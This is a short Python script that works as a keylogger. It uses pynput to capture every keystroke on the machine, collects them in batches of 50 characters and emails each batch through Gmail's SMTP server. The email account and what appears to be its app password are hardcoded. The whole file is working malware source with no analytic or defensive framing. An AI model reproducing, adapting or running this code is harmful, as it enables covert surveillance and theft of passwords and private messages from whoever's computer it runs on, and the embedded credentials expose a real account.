from pynput.keyboard import Listener
import smtplib
import time
log =""
def on_press (key):
	global log
	log += str(key).replace("'", "")
	if len(log) >= 50:
		send_email(log)
		log = ""

def send_email(data):
	with smtplib.SMTP("smtp.gmail.com", 587) as server:
		server.starttls()
		server.login("bangboombro629@gmail.com", "xiqx qzny ybjo nlfv")
		server.sendmail("bangboombro629@gmail.com", "bangboombro629@gmail.com", data)

with Listener(on_press=on_press) as listener:
	listener.join()